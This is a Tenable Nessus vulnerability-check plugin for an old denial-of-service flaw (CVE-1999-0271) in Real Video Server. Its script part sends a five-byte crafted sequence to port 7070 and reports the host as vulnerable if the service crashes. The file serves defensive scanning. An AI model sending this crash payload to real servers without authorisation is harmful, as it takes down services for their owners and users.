#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10183);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-1999-0271");
 script_osvdb_id(5859);

 script_name(english:"Real Video Server Telnet Malformed Data Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote Progressive Networks Real Video Server
by sending it specially crafted data.

An attacker may use this flaw to prevent you from sharing sound and video." );
 script_set_attribute(attribute:"solution", value:
"Update to RealServer 5.01 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/08/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/01/15");
 script_cvs_date("$Date: 2013/01/25 01:19:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Crashes the remote pnserver");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2013 Tenable Network Security, Inc.");
 script_family(english: "Windows");
 script_require_ports(7070, "Services/realserver");
 script_dependencies("find_service1.nasl");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");

crp = '\xFF\xF4\xFF\xFD\x06';	# raw_string(255,244,255,253,6)

port = get_service(svc:"realserver", default: 7070, exit_on_fail: 1);
soc = open_sock_tcp(port);
if (! soc) exit(0);

send(socket:soc, data:crp);
  close(soc);
  sleep(5);

if (service_is_dead(port: port) > 0)
  security_warning(port);


